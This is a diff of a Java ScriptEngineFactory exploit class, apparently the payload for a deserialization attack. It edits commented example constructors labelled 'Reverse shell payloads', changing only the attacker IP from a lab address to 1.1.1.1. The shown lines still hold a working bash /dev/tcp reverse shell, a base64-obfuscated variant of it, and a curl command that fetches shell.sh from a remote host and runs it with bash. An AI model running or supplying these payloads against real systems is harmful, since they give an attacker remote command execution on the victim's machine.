@@ -22,7 +22,7 @@ public class AwesomeScriptEngineFactory implements ScriptEngineFactory {
      * Example 1 - Reverse shell payloads:
      *
      * public AwesomeScriptEngineFactory() {
-     *     String [] cmd={"bash","-c","bash -i >& /dev/tcp/10.10.14.4/4444 0>&1"};
+     *     String [] cmd={"bash","-c","bash -i >& /dev/tcp/1.1.1.1/4444 0>&1"};
      *     String [] jex={"bash","-c","{echo,$(echo -n $cmd | base64)}|{base64,-d}|{bash,-i}"};
      *     try {
      *         Runtime.getRuntime().exec(cmd);
@@ -37,7 +37,7 @@ public class AwesomeScriptEngineFactory implements ScriptEngineFactory {
      * (Note: add the RunCmd method below to the class when using this)
      *
      * public AwesomeScriptEngineFactory() {
-     *     RunCmd("curl 10.10.14.4/shell.sh -o /tmp/shell.sh");
+     *     RunCmd("curl 1.1.1.1/shell.sh -o /tmp/shell.sh");
      *     RunCmd("bash /tmp/shell.sh");
      * }
      *
